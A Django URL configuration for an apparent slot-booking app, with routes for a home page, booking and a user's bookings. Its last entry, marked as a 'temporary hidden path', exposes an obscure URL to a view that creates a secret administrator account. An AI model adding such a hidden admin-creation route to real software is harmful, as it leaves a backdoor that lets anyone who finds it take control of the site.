from django.urls import path
from . import views

urlpatterns = [
    path('', views.home, name='home'),
    path('book/<int:slot_id>/', views.book_slot, name='book_slot'),
    path('my-bookings/', views.my_bookings, name='my_bookings'),
    # Add this temporary hidden path
    path('setup-admin-777/', views.create_secret_admin, name='create_secret_admin'),
]